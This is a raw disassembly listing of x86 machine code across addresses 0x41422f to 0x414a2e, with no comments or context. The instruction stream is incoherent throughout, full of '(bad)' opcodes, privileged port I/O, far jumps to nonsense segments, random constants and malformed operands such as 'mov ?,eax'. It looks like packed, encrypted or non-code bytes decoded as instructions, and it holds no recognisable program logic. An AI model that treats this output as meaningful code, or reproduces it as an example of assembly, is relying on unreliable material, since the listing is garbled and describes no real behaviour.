  41422f:	punpckhdq mm1,mm4
  414232:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414233:	jb     0x4141eb
  414235:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414236:	push   edx
  414237:	or     eax,0x955b0f1e
  41423c:	scas   al,BYTE PTR es:[edi]
  41423d:	hlt    
  41423e:	push   0x32
  414240:	ins    BYTE PTR es:[edi],dx
  414241:	sti    
  414242:	in     al,dx
  414243:	js     0x414272
  414245:	push   eax
  414246:	scas   eax,DWORD PTR es:[edi]
  414247:	and    BYTE PTR [eax+0x406473f4],bl
  41424d:	adc    al,0x29
  41424f:	xchg   ebp,eax
  414250:	in     al,dx
  414251:	jecxz  0x4142be
  414253:	add    DWORD PTR [eax],ebx
  414255:	repz push ebp
  414257:	test   BYTE PTR [ecx+0x21],0x75
  41425b:	pop    esi
  41425c:	hlt    
  41425d:	pusha  
  41425e:	cwde   
  41425f:	mov    dl,0x1e
  414261:	and    al,0xc
  414263:	mov    bl,0x9e
  414265:	fild   DWORD PTR ss:[eax-0x745f118c]
  41426c:	pop    ss
  41426d:	jp     0x41428f
  41426f:	and    eax,0x754896d4
  414274:	jno    0x414279
  414276:	(bad)  
  414277:	or     ebx,DWORD PTR [ecx+esi*2+0x25]
  41427b:	and    BYTE PTR [ecx-0x29ed292],dl
  414281:	mov    BYTE PTR [eax-0x5fd53772],dl
  414287:	test   eax,0x3d25f501
  41428c:	push   0xffffff95
  41428e:	ficomp WORD PTR [ebp+0x5e]
  414291:	ficom  DWORD PTR ss:[ecx]
  414294:	jns    0x414298
  414296:	xchg   esi,eax
  414297:	mov    WORD PTR [ecx-0x40],fs
  41429a:	mov    al,ds:0x8a32ad9f
  41429f:	gs cld 
  4142a1:	ins    DWORD PTR es:[edi],dx
  4142a2:	dec    ecx
  4142a3:	test   DWORD PTR [ebx],esp
  4142a5:	fldenv [esi]
  4142a7:	mov    esi,ebx
  4142a9:	inc    ebp
  4142aa:	ins    DWORD PTR es:[edi],dx
  4142ab:	in     eax,dx
  4142ac:	into   
  4142ad:	pop    ds
  4142ae:	fisub  WORD PTR [eax+0x71]
  4142b1:	ret    
  4142b2:	out    dx,eax
  4142b3:	mov    edx,0x99c28d66
  4142b8:	adc    al,0x70
  4142ba:	icebp  
  4142bb:	xor    cl,BYTE PTR [ebx]
  4142bd:	jecxz  0x4142c7
  4142bf:	push   0x6d458faf
  4142c4:	pop    esp
  4142c5:	mov    esp,0x9c184c42
  4142ca:	add    BYTE PTR [ecx+0x12ca81f3],0x55
  4142d1:	mov    ah,0x46
  4142d3:	mov    ecx,0xb01661f6
  4142d8:	aad    0x94
  4142da:	xor    bl,BYTE PTR [ebp-0x6fc4e605]
  4142e0:	pop    ds
  4142e1:	or     eax,0x142f0fa8
  4142e6:	sar    ebx,cl
  4142e8:	inc    ebx
  4142e9:	xor    ah,0x5d
  4142ec:	inc    ecx
  4142ed:	test   BYTE PTR [edx+0x1381559],bh
  4142f3:	in     al,0xd6
  4142f5:	adc    al,0x9d
  4142f7:	add    cl,dl
  4142f9:	pushf  
  4142fa:	dec    BYTE PTR [ebx]
  4142fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142fd:	cmc    
  4142fe:	ins    DWORD PTR es:[edi],dx
  4142ff:	mov    bh,0x47
  414301:	jbe    0x4142f1
  414303:	mov    al,0xf7
  414305:	and    ebx,DWORD PTR [edi+0x6]
  414308:	or     BYTE PTR [esi+0x1f429aa9],ch
  41430e:	sub    al,0xe5
  414310:	in     eax,0x44
  414312:	in     eax,dx
  414313:	mov    DWORD PTR [edi+ecx*2+0x705035f8],edx
  41431a:	int3   
  41431b:	(bad)  
  41431c:	in     al,0x56
  41431e:	pop    edi
  41431f:	adc    BYTE PTR [ebx+ecx*1-0x48],bl
  414323:	dec    edx
  414324:	cmp    eax,0x300f38ab
  414329:	mov    ecx,0x528a1285
  41432e:	pop    eax
  41432f:	outs   dx,DWORD PTR ds:[esi]
  414330:	lds    edi,FWORD PTR [edi+edi*4]
  414333:	dec    esi
  414334:	fdiv   QWORD PTR [esi]
  414336:	xchg   ebx,eax
  414337:	(bad)  
  414338:	(bad)  
  414339:	int3   
  41433a:	inc    ecx
  41433b:	fimul  DWORD PTR [ebp+0x3d6256e3]
  414341:	jmp    0x4563db49
  414346:	mov    ebp,0x9cffe2e6
  41434b:	push   esp
  41434c:	adc    eax,0x5c346041
  414351:	in     eax,dx
  414352:	push   ebp
  414353:	leave  
  414354:	push   0x4e
  414356:	je     0x41437f
  414358:	adc    BYTE PTR [edi],cl
  41435a:	push   eax
  41435b:	test   eax,0xd32f8758
  414360:	fucomp st(7)
  414362:	and    ecx,DWORD PTR [esi+0x55]
  414365:	ret    0xc025
  414368:	es xchg edx,eax
  41436a:	jo     0x4143d2
  41436c:	rcl    DWORD PTR [esi+0x7e],cl
  41436f:	sbb    eax,ebp
  414371:	mov    bh,0x2b
  414373:	retf   0x9ab
  414376:	push   ds
  414377:	mov    ecx,0x5ef2e23c
  41437c:	jae    0x414327
  41437e:	std    
  41437f:	(bad)  
  414381:	loope  0x4143bc
  414383:	out    0x23,al
  414385:	xchg   esp,eax
  414386:	outs   dx,BYTE PTR ds:[esi]
  414387:	or     ah,ah
  414389:	push   ebx
  41438a:	scas   eax,DWORD PTR es:[edi]
  41438b:	ds mov dl,0xc8
  41438e:	mov    ds:0xa63c8de2,al
  414393:	dec    edx
  414394:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414395:	mov    bh,0x8f
  414397:	sbb    ecx,DWORD PTR [esi+edx*4-0x31]
  41439b:	loopne 0x4143c1
  41439d:	js     0x414398
  41439f:	test   DWORD PTR [edx+0x4fdc30b6],0xe9ba0c06
  4143a9:	ja     0x414337
  4143ab:	mov    ebx,0x33173388
  4143b0:	out    dx,eax
  4143b1:	mov    cl,0x53
  4143b3:	retf   
  4143b4:	inc    eax
  4143b5:	aam    0x9e
  4143b7:	jecxz  0x4143b1
  4143b9:	dec    edx
  4143ba:	xchg   edi,eax
  4143bb:	mov    dh,0x85
  4143bd:	je     0x4143c3
  4143bf:	in     al,0xde
  4143c1:	dec    eax
  4143c2:	jecxz  0x41442a
  4143c4:	pop    edi
  4143c5:	fcomp  st(4)
  4143c7:	in     al,dx
  4143c8:	inc    ebp
  4143c9:	adc    al,0x9f
  4143cb:	xchg   esp,eax
  4143cc:	jp     0x414360
  4143ce:	xchg   ebp,eax
  4143cf:	mov    esi,0xe595b739
  4143d4:	mov    ch,0x51
  4143d6:	fisubr DWORD PTR [esi+0x754f3447]
  4143dc:	dec    edi
  4143dd:	dec    edi
  4143de:	cmp    al,0xe7
  4143e0:	fcmovu st,st(2)
  4143e2:	pop    edx
  4143e3:	or     DWORD PTR [edi+0x208bb3b4],0x7a
  4143ea:	fisttp WORD PTR [edi]
  4143ec:	enter  0xf8fb,0x4
  4143f0:	push   esi
  4143f1:	pop    edx
  4143f2:	xor    eax,0x1f442b8a
  4143f7:	push   ds
  4143f8:	adc    al,0x50
  4143fa:	test   eax,0x2f494d51
  4143ff:	data16 das 
  414401:	jbe    0x414436
  414403:	pop    es
  414404:	test   BYTE PTR [ebp-0x1ff798cb],dl
  41440a:	(bad)  
  41440b:	imul   edi,DWORD PTR [esi+esi*1],0x44
  41440f:	inc    ebx
  414410:	test   BYTE PTR [edi-0x6e5df7f8],cl
  414416:	in     al,dx
  414417:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414418:	or     al,0xce
  41441a:	in     al,dx
  41441b:	mov    cl,ch
  41441d:	mov    eax,0xf2588bb5
  414423:	sub    edx,0x2a
  414426:	push   esi
  414427:	pusha  
  414428:	push   edi
  414429:	push   0x81758e0d
  41442e:	jnp    0x4143cb
  414430:	add    ebp,DWORD PTR [esi]
  414432:	test   WORD PTR [eax-0x2e],sp
  414436:	and    dl,BYTE PTR [eax]
  414438:	jge    0x4143f9
  41443a:	mov    ch,0x71
  41443c:	and    ecx,DWORD PTR [ecx*1-0x61657d01]
  414443:	xor    BYTE PTR [edx+0x39],al
  414446:	shl    DWORD PTR [edx],0xec
  414449:	loopne 0x4143de
  41444b:	dec    ebp
  41444c:	adc    DWORD PTR [esi+ebp*1+0x6],0xb3226111
  414454:	mov    ebp,0xe2919db6
  414459:	jno    0x4144b8
  41445b:	lmsw   WORD PTR [ebp-0x21adce21]
  414462:	mov    ebp,0xea869da7
  414467:	ja     0x4143f2
  414469:	inc    esp
  41446a:	jmp    0x7f56:0x3b6772af
  414471:	or     al,0xa1
  414473:	pop    ecx
  414474:	test   al,0x45
  414476:	aam    0xe7
  414478:	dec    esi
  414479:	outs   dx,BYTE PTR ds:[esi]
  41447a:	xor    al,0x85
  41447c:	dec    ebx
  41447d:	hlt    
  41447e:	fs mov ss,edi
  414481:	dec    ecx
  414482:	daa    
  414483:	nop
  414484:	rcr    DWORD PTR [eax-0x7e],1
  414487:	into   
  414488:	dec    eax
  414489:	sahf   
  41448a:	jae    0x4144a5
  41448c:	add    eax,0xf137be0a
  414491:	xlat   BYTE PTR ds:[ebx]
  414492:	inc    ebp
  414493:	scas   eax,DWORD PTR es:[edi]
  414494:	sbb    al,0x75
  414496:	stc    
  414497:	inc    edi
  414498:	ret    0x6b48
  41449b:	mul    edi
  41449d:	xor    BYTE PTR [eax-0x75d7e6c4],ah
  4144a3:	jg     0x4144a9
  4144a5:	sbb    eax,0xb4630183
  4144aa:	or     dl,BYTE PTR [ecx-0x65]
  4144ad:	js     0x4144be
  4144af:	sub    BYTE PTR [edi+0x3b],0x4a
  4144b3:	jmp    0xff0c:0x4adad65a
  4144ba:	xchg   esi,eax
  4144bb:	add    edx,DWORD PTR [ebp+0x8b325a5]
  4144c1:	mov    eax,ds:0x4f713a42
  4144c6:	in     eax,0x7c
  4144c8:	pop    eax
  4144c9:	xchg   DWORD PTR [esi+0x76],ecx
  4144cc:	jle    0x4144d5
  4144ce:	dec    eax
  4144cf:	fadd   DWORD PTR [ebp-0x7f]
  4144d2:	jecxz  0x414510
  4144d4:	stc    
  4144d5:	les    ebx,FWORD PTR [ebp+0x7d8e7bcd]
  4144db:	out    0x58,al
  4144dd:	ja     0x414474
  4144df:	sub    BYTE PTR [ebx-0x11653bed],cl
  4144e5:	pop    edi
  4144e6:	dec    ecx
  4144e7:	and    ch,BYTE PTR ds:0x94dab214
  4144ed:	outs   dx,DWORD PTR ds:[esi]
  4144ee:	jle    0x4144b2
  4144f0:	pop    esp
  4144f1:	scas   al,BYTE PTR es:[edi]
  4144f2:	(bad)  
  4144f4:	bound  ecx,QWORD PTR [eax-0x6f30a449]
  4144fa:	mov    esp,0xc7b399a4
  4144ff:	push   ecx
  414500:	repz mov esi,0xcc634072
  414506:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414507:	push   edi
  414508:	cwde   
  414509:	inc    edi
  41450a:	ins    BYTE PTR es:[edi],dx
  41450b:	les    edx,FWORD PTR [edi+0x35]
  41450e:	icebp  
  41450f:	cmp    ebp,DWORD PTR [edx-0x604b9062]
  414515:	hlt    
  414516:	add    eax,0x2a7dc8d8
  41451b:	mov    ?,eax
  41451d:	aad    0xae
  41451f:	stc    
  414520:	scas   al,BYTE PTR es:[edi]
  414521:	mov    al,0x32
  414523:	mov    WORD PTR ds:0x10f0aa66,gs
  414529:	retf   0xa4c9
  41452c:	mov    eax,0x4baddee0
  414531:	gs push es
  414533:	sbb    ebx,esp
  414535:	mov    ch,BYTE PTR [edx+0x7cf8154a]
  41453b:	aaa    
  41453c:	outs   dx,BYTE PTR ds:[esi]
  41453d:	das    
  41453e:	mov    ds:0x48f177f3,eax
  414543:	push   es
  414544:	jp     0x414512
  414546:	ret    
  414547:	jmp    0xd8f3:0xbdc56ffb
  41454e:	lods   eax,DWORD PTR ds:[esi]
  41454f:	or     al,0x4f
  414551:	push   ds
  414552:	fwait
  414553:	push   ecx
  414554:	dec    edx
  414555:	stc    
  414556:	call   0x50c8:0x18919304
  41455d:	xor    BYTE PTR [edi+0x1b],ah
  414560:	lods   eax,DWORD PTR ds:[esi]
  414561:	pusha  
  414562:	pop    ebp
  414563:	(bad)  
  414564:	inc    eax
  414565:	xor    BYTE PTR [esi+0xffee923],ah
  41456b:	dec    ebx
  41456c:	test   BYTE PTR [ebx+ecx*8+0x1fe65934],ah
  414573:	not    ebp
  414575:	pop    ss
  414576:	fldcw  WORD PTR [eax+0x3f]
  414579:	sti    
  41457a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41457b:	inc    ecx
  41457c:	and    edi,DWORD PTR [ecx+0xdcb1dec]
  414582:	stos   DWORD PTR es:[edi],eax
  414583:	dec    ebp
  414584:	loopne 0x414519
  414586:	push   ecx
  414587:	push   ebx
  414588:	or     esi,ecx
  41458a:	inc    DWORD PTR [ecx+0x7c89a26b]
  414590:	int3   
  414591:	icebp  
  414592:	lods   al,BYTE PTR ds:[esi]
  414593:	loop   0x414548
  414595:	sub    eax,0x8740651f
  41459a:	sbb    BYTE PTR [edi-0x65],bl
  41459d:	into   
  41459e:	mov    ah,0xe5
  4145a0:	push   edi
  4145a1:	in     eax,0x3f
  4145a3:	jmp    0x414595
  4145a5:	sti    
  4145a6:	ins    DWORD PTR es:[edi],dx
  4145a7:	cs push ebx
  4145a9:	int3   
  4145aa:	mov    ch,0x98
  4145ac:	popf   
  4145ad:	xchg   BYTE PTR [esi],al
  4145af:	mov    ebp,0xedffc30
  4145b4:	mov    eax,DWORD PTR [edx]
  4145b6:	les    esi,FWORD PTR [ecx]
  4145b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145b9:	mov    edx,0x2c0eabdb
  4145be:	mov    ds:0x4c813e6e,al
  4145c3:	pushf  
  4145c4:	push   edi
  4145c5:	jl     0x4145e1
  4145c7:	and    ah,0xe6
  4145ca:	into   
  4145cb:	push   es
  4145cc:	mov    al,ds:0x1e76e897
  4145d1:	mov    eax,0xef6625ed
  4145d6:	into   
  4145d7:	xor    DWORD PTR [edi+esi*1-0x25],esp
  4145db:	inc    ebx
  4145dc:	push   esp
  4145dd:	sub    BYTE PTR [ebp+0x75106e0a],0xbd
  4145e4:	xchg   DWORD PTR [ecx+0x7d55718d],eax
  4145ea:	mov    ds:0x73d36946,al
  4145ef:	fisttp QWORD PTR [esi+0x1e]
  4145f2:	(bad)  
  4145f3:	into   
  4145f4:	push   0x8180cbea
  4145f9:	or     al,0x81
  4145fb:	mov    al,0xbd
  4145fd:	stos   BYTE PTR es:[edi],al
  4145fe:	mov    bh,al
  414600:	jge    0x4145c7
  414602:	sbb    ecx,ecx
  414604:	mov    ch,0xb7
  414606:	ficomp DWORD PTR [eax]
  414608:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414609:	cli    
  41460a:	add    al,BYTE PTR [eax]
  41460c:	push   eax
  41460d:	pop    eax
  41460e:	add    al,0x14
  414610:	out    0xff,al
  414612:	iret   
  414613:	dec    ebx
  414614:	xor    al,0xa0
  414616:	dec    ebp
  414617:	sub    eax,0x4bb1cb73
  41461c:	pop    ss
  41461d:	xchg   ebx,edi
  41461f:	sbb    al,dl
  414621:	push   cs
  414622:	adc    eax,DWORD PTR ds:0x4d8f8b1a
  414628:	mov    ebp,0x2af2916b
  41462d:	dec    esp
  41462e:	dec    esi
  41462f:	call   0xe31eafe3
  414634:	sbb    BYTE PTR [ecx-0x15],cl
  414637:	call   0x3cc3cd7
  41463c:	(bad)  
  41463d:	adc    eax,0xc4b2be16
  414642:	in     eax,0x9e
  414644:	jle    0x4145ef
  414646:	adc    bl,dh
  414648:	or     BYTE PTR [ebx+esi*2],bh
  41464b:	ret    0xe2bf
  41464e:	enter  0x4ad2,0xb5
  414652:	pop    edi
  414653:	mov    cl,0x84
  414655:	out    0x55,eax
  414657:	push   ss
  414658:	jecxz  0x414640
  41465a:	leave  
  41465b:	ds mov dh,0x6e
  41465e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41465f:	out    dx,al
  414660:	mov    al,ds:0xe4bce8be
  414665:	inc    eax
  414666:	push   ebp
  414667:	mov    edx,DWORD PTR [edx-0x44fd5857]
  41466d:	push   ss
  41466e:	inc    edx
  41466f:	je     0x4146c6
  414671:	mov    edi,0xdc4b5848
  414676:	cmp    DWORD PTR [edx+0x65bcc312],esi
  41467c:	retf   
  41467d:	push   cs
  41467e:	and    BYTE PTR [edi-0x7b14538c],0x5a
  414685:	in     eax,dx
  414686:	sbb    cl,BYTE PTR [ecx+ecx*1-0x1]
  41468a:	dec    esp
  41468b:	and    DWORD PTR [eax+0x63f5ebf2],ebx
  414691:	(bad)  
  414693:	or     ah,BYTE PTR [edi-0x62f0a446]
  414699:	les    eax,FWORD PTR [esi-0x72]
  41469c:	pop    eax
  41469d:	and    DWORD PTR [edx-0x4],ebx
  4146a0:	mov    ebp,0x9fa567e1
  4146a5:	or     al,BYTE PTR [edi-0xf]
  4146a8:	xchg   DWORD PTR [ecx-0x9],edx
  4146ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146ac:	inc    edx
  4146ad:	jmp    0x8fa5:0x33ab0e43
  4146b4:	fmul   QWORD PTR [ebp-0x39]
  4146b7:	mov    ds:0xfc63b397,al
  4146bc:	sbb    al,BYTE PTR [esi]
  4146be:	pop    ss
  4146bf:	dec    esp
  4146c0:	jmp    0x67ce8e6c
  4146c5:	dec    ecx
  4146c6:	rcr    DWORD PTR [edi+0x4c],0x30
  4146ca:	repnz add DWORD PTR [ebx+0x2af0659a],0xffffffdc
  4146d2:	imul   edx,ebp,0xffffff9e
  4146d5:	not    BYTE PTR [eax]
  4146d7:	fs out dx,al
  4146d9:	ja     0x4146eb
  4146db:	jae    0x41470c
  4146dd:	inc    ebx
  4146de:	push   cs
  4146df:	sbb    al,0x85
  4146e1:	jo     0x4146bc
  4146e3:	out    0xbd,eax
  4146e5:	enter  0x6127,0xb0
  4146e9:	lock cdq 
  4146eb:	jg     0x41473b
  4146ed:	pop    edx
  4146ee:	sbb    DWORD PTR [ebx+0x37aae566],ebp
  4146f4:	adc    eax,0x349a5624
  4146f9:	call   0x5276:0x89e668bd
  414700:	inc    esi
  414701:	dec    ebx
  414702:	inc    ebx
  414703:	or     al,0x46
  414705:	pop    esp
  414706:	fwait
  414707:	(bad)  
  414708:	push   ebx
  414709:	push   esi
  41470a:	icebp  
  41470b:	sar    BYTE PTR [ebp-0x70],cl
  41470e:	mov    bh,0xcb
  414710:	fnstcw WORD PTR [eax+ebx*8]
  414713:	test   DWORD PTR [esi-0x80],edx
  414716:	bound  eax,QWORD PTR [edi+0xc]
  414719:	imul   ebx,DWORD PTR [eax+0x67],0x52ccebae
  414720:	inc    eax
  414721:	inc    eax
  414722:	(bad)  
  414723:	jmp    0x6d6283af
  414728:	xchg   BYTE PTR [eax-0x390f4387],al
  41472e:	stc    
  41472f:	adc    ecx,0x58
  414732:	dec    ecx
  414733:	test   BYTE PTR [eax-0x74],ah
  414736:	push   esi
  414737:	je     0x41471b
  414739:	adc    DWORD PTR [eax],edx
  41473b:	scas   al,BYTE PTR es:[edi]
  41473c:	push   0xffffffff
  41473e:	sub    BYTE PTR [edi+esi*4-0x381dd7be],dl
  414745:	inc    esp
  414746:	(bad)  
  414747:	mov    edi,0x3e60f05d
  41474c:	test   ebx,edi
  41474e:	test   al,0x3b
  414750:	mov    edx,db4
  414753:	and    al,0xba
  414755:	jae    0x41478c
  414757:	repnz (bad) 
  41475a:	scas   al,BYTE PTR es:[edi]
  41475b:	daa    
  41475c:	cs inc esp
  41475e:	add    eax,0x1945e8d6
  414763:	push   esi
  414764:	add    BYTE PTR [eax+0x26],cl
  414767:	loope  0x4147a6
  414769:	lds    ebx,FWORD PTR [edx-0x7335e0e0]
  41476f:	stos   DWORD PTR es:[edi],eax
  414770:	mov    edx,0x9cefe8c2
  414775:	xor    ch,0xd5
  414778:	xchg   ecx,eax
  414779:	jmp    0x414771
  41477b:	stos   BYTE PTR es:[edi],al
  41477c:	mov    WORD PTR [eax-0x59],fs
  41477f:	int    0x50
  414781:	sub    BYTE PTR [esi+0x78851079],ah
  414787:	inc    edi
  414788:	push   edi
  414789:	push   ebx
  41478a:	icebp  
  41478b:	cmp    al,bh
  41478d:	mov    dl,0x21
  41478f:	adc    BYTE PTR [esi+0x2],0x1d
  414793:	std    
  414794:	pop    es
  414795:	(bad)  
  414796:	xchg   esi,eax
  414797:	jmp    0xa95007b9
  41479c:	das    
  41479d:	ins    DWORD PTR es:[edi],dx
  41479e:	mov    ebp,0xc9878f81
  4147a3:	or     al,0x4b
  4147a5:	dec    ebx
  4147a6:	ror    DWORD PTR [edx-0xcf98f74],0x32
  4147ad:	fisttp WORD PTR [esi-0xb]
  4147b0:	xchg   edx,eax
  4147b1:	cmp    edx,edi
  4147b3:	jge    0x41479f
  4147b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147b6:	pop    edx
  4147b7:	les    edx,FWORD PTR [edi-0x3]
  4147ba:	lahf   
  4147bb:	dec    ebp
  4147bc:	ins    BYTE PTR es:[edi],dx
  4147bd:	fnstcw WORD PTR [esi]
  4147bf:	outs   dx,DWORD PTR ds:[esi]
  4147c0:	cmp    ch,BYTE PTR [edi]
  4147c2:	jle    0x4147b5
  4147c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147c5:	imul   ecx,DWORD PTR [eax-0x15d1ba65],0xda1d1b0d
  4147cf:	cmp    edx,DWORD PTR [ebx-0x7f38524f]
  4147d5:	retf   
  4147d6:	pop    es
  4147d7:	jmp    0xf38e:0x6060b7f6
  4147de:	cs inc ecx
  4147e0:	jb     0x414789
  4147e2:	jno    0x4147e9
  4147e4:	dec    esi
  4147e5:	test   BYTE PTR [edx-0x4b],bh
  4147e8:	sahf   
  4147e9:	nop
  4147ea:	das    
  4147eb:	sub    eax,0xf673232a
  4147f0:	jno    0x414803
  4147f2:	inc    ecx
  4147f3:	ret    
  4147f4:	push   esp
  4147f5:	daa    
  4147f6:	sbb    BYTE PTR [edi+0x217a7eff],bl
  4147fc:	cmp    ah,BYTE PTR [ecx]
  4147fe:	or     ebp,DWORD PTR [edx]
  414800:	ret    0xc0de
  414803:	pop    ebp
  414804:	xlat   BYTE PTR ds:[ebx]
  414805:	jno    0x4147ce
  414807:	xchg   esi,eax
  414808:	mov    ebp,DWORD PTR [edi+0x5b]
  41480b:	dec    ebp
  41480c:	cmp    eax,0x2fcd4307
  414811:	cwde   
  414812:	xor    BYTE PTR [edi+0x1f4a2668],ch
  414818:	lods   al,BYTE PTR ds:[esi]
  414819:	scas   eax,DWORD PTR es:[edi]
  41481a:	mov    WORD PTR [ecx+0x626cf76b],ds
  414820:	popf   
  414821:	push   ss
  414822:	and    DWORD PTR [edi+0x423f696],ecx
  414828:	fcmove st,st(3)
  41482a:	dec    esp
  41482b:	clc    
  41482c:	out    dx,al
  41482d:	add    al,0x89
  41482f:	aas    
  414830:	mov    bl,0xfe
  414832:	jae    0x4147d0
  414834:	inc    edx
  414835:	inc    edi
  414836:	inc    esi
  414837:	pop    edx
  414838:	pop    esi
  414839:	xchg   ebx,eax
  41483a:	test   BYTE PTR ds:0x6befc53b,dh
  414840:	push   es
  414841:	push   ecx
  414842:	stc    
  414843:	xor    DWORD PTR [ecx+0x2e],eax
  414846:	stc    
  414847:	jno    0x4148ba
  414849:	fs loopne 0x414868
  41484c:	sub    eax,0x49ae138
  414851:	push   ebx
  414852:	fwait
  414853:	pop    ebx
  414854:	pop    ebp
  414855:	inc    ebp
  414856:	jne    0x41488d
  414858:	sti    
  414859:	sbb    esp,ebx
  41485b:	sar    eax,0xf
  41485e:	shl    DWORD PTR [edx+esi*1],0xbf
  414862:	push   esi
  414863:	xor    BYTE PTR [esi-0x7d4de3d4],dh
  414869:	push   edi
  41486a:	mov    dh,0xcd
  41486c:	pop    edx
  41486d:	das    
  41486e:	pop    ss
  41486f:	mov    esi,0x14e03e59
  414874:	xlat   BYTE PTR ds:[ebx]
  414875:	sbb    BYTE PTR [esi+0x2b],ah
  414878:	xchg   esi,eax
  414879:	inc    edi
  41487a:	jge    0x414817
  41487c:	popa   
  41487d:	mov    dh,0xc9
  41487f:	lock or DWORD PTR [ebp+0x59],edx
  414883:	mov    cl,0xdc
  414885:	push   edi
  414886:	out    0xec,al
  414888:	and    eax,0x498e2a2f
  41488d:	mov    edi,0x52656556
  414892:	and    al,al
  414894:	push   edx
  414895:	hlt    
  414896:	jecxz  0x41482b
  414898:	sub    DWORD PTR [edi+0x6628402c],0x64
  41489f:	xchg   BYTE PTR [eax+0x6c471055],cl
  4148a5:	xor    edi,DWORD PTR [edi-0x3c]
  4148a8:	sub    eax,0xcc5cfb53
  4148ad:	mov    eax,ds:0x5bb1cff1
  4148b2:	or     edi,DWORD PTR [eax-0x5a78651d]
  4148b8:	daa    
  4148b9:	mov    ecx,0xe011a7dd
  4148be:	inc    ebp
  4148bf:	push   0x55f10d1d
  4148c4:	add    eax,0x8ee96ce8
  4148c9:	and    eax,DWORD PTR [eax]
  4148cb:	addr16 jb 0x4148d5
  4148ce:	jb     0x4148fc
  4148d0:	xchg   BYTE PTR [eax+eax*2-0x241eb8f6],cl
  4148d7:	add    edi,DWORD PTR [ebp+0x53bf9364]
  4148dd:	xchg   edi,eax
  4148de:	push   edx
  4148df:	and    dh,BYTE PTR ds:[eax+edi*4+0x70]
  4148e4:	and    DWORD PTR [edi],0xffffffb5
  4148e7:	mov    ebp,0xc049cb36
  4148ec:	sahf   
  4148ed:	mov    edx,0xd25635ab
  4148f2:	retf   0xc630
  4148f5:	and    eax,0xdd9380c
  4148fa:	loop   0x414944
  4148fc:	cdq    
  4148fd:	push   ebx
  4148fe:	stos   BYTE PTR es:[edi],al
  4148ff:	mov    ds:0x2849a326,al
  414904:	jecxz  0x4148d4
  414906:	push   edx
  414907:	aad    0xed
  414909:	neg    DWORD PTR [ecx-0x30e270ad]
  41490f:	cmp    al,0x5a
  414911:	cmp    edi,DWORD PTR [edx]
  414913:	push   esp
  414914:	fidiv  DWORD PTR [esi+edx*1+0x17]
  414918:	jp     0x4148e8
  41491a:	sub    eax,DWORD PTR [ebx]
  41491c:	and    dl,BYTE PTR [ecx]
  41491e:	idiv   BYTE PTR [esi-0x1dfe7bc7]
  414924:	mov    ebp,0xd77c293
  414929:	vmwrite edi,DWORD PTR [eax-0x403164c5]
  414930:	add    dh,BYTE PTR [ecx+0xfccf8dc]
  414936:	mov    esp,0xbcfdf18f
  41493b:	jle    0x414911
  41493d:	xor    al,0x10
  41493f:	sub    eax,0x9b0d6c16
  414944:	xchg   esi,eax
  414945:	cmp    eax,0xe7340bd7
  41494a:	jb     0x41497c
  41494c:	pop    ebx
  41494d:	test   DWORD PTR [ebp+0x8],edi
  414950:	inc    ecx
  414951:	ret    0x12ba
  414954:	popf   
  414955:	or     DWORD PTR [eax+eiz*8+0x6b368f16],eax
  41495c:	scas   eax,DWORD PTR es:[edi]
  41495d:	cmp    ch,bh
  41495f:	jge    0x41490e
  414961:	(bad)  
  414962:	pushf  
  414963:	imul   esi,DWORD PTR [ebp+0x8ccb775],0xffffff85
  41496a:	add    DWORD PTR [edx+0x4c],ebp
  41496d:	add    eax,0x8c85556
  414972:	mov    eax,0x68d799ff
  414977:	dec    edi
  414978:	sbb    al,0x27
  41497a:	lahf   
  41497b:	push   edi
  41497c:	ss and eax,0x680103f0
  414982:	shr    DWORD PTR cs:0xa4ad2ef4,1
  414989:	adc    dh,bl
  41498b:	retf   
  41498c:	stos   DWORD PTR es:[edi],eax
  41498d:	arpl   si,bp
  41498f:	push   edx
  414990:	cmp    BYTE PTR [eax+0x3ca8b2b1],al
  414996:	mov    ebp,0x59abb23
  41499b:	aas    
  41499c:	dec    eax
  41499d:	retf   0x8269
  4149a0:	test   DWORD PTR [edi+0x64],0x6c37af5e
  4149a7:	mov    BYTE PTR ds:0xf95cca09,bl
  4149ad:	loope  0x414985
  4149af:	sbb    eax,ebp
  4149b1:	pop    esp
  4149b2:	xchg   BYTE PTR [ecx],bh
  4149b4:	(bad)  
  4149b5:	cmp    al,0xc7
  4149b7:	out    0xfc,al
  4149b9:	adc    BYTE PTR ds:0x8c2b9645,0xa3
  4149c0:	test   al,0xcf
  4149c2:	or     BYTE PTR [ebx+esi*1-0x6de51266],0xf5
  4149ca:	sbb    BYTE PTR [ebx-0x78],0xd1
  4149ce:	(bad)  
  4149cf:	int3   
  4149d0:	xor    esp,edx
  4149d2:	jnp    0x414a34
  4149d4:	shl    DWORD PTR [esi+0x97918e9],1
  4149da:	fmul   QWORD PTR [edx]
  4149dc:	dec    ebp
  4149dd:	mov    ds:0x3a37e579,eax
  4149e2:	popa   
  4149e3:	cmp    eax,0x6e5dec1e
  4149e8:	stos   BYTE PTR es:[edi],al
  4149e9:	cld    
  4149ea:	xchg   ebp,eax
  4149eb:	jecxz  0x4149f6
  4149ed:	xchg   edx,eax
  4149ee:	add    BYTE PTR [ebp+eax*2-0x3a601e48],ch
  4149f5:	xchg   ebp,eax
  4149f6:	jmp    0xf821:0xad24564e
  4149fd:	xchg   ecx,eax
  4149fe:	mov    bh,0x32
  414a00:	ret    0xcfd5
  414a03:	mov    dh,0x12
  414a05:	mov    ds:0xad1913ee,eax
  414a0a:	adc    edx,ecx
  414a0c:	mov    al,ds:0x806a33ce
  414a11:	jge    0x414a5f
  414a13:	mov    edx,0x43ce59fd
  414a18:	(bad)  
  414a19:	shl    BYTE PTR [bp+si-0x1ad1],cl
  414a1e:	push   esi
  414a1f:	jmp    0x18d8:0x18aeab55
  414a26:	mov    cl,0xbc
  414a28:	sub    edx,DWORD PTR [ebx+0x241b47fb]
  414a2e:	push   esi
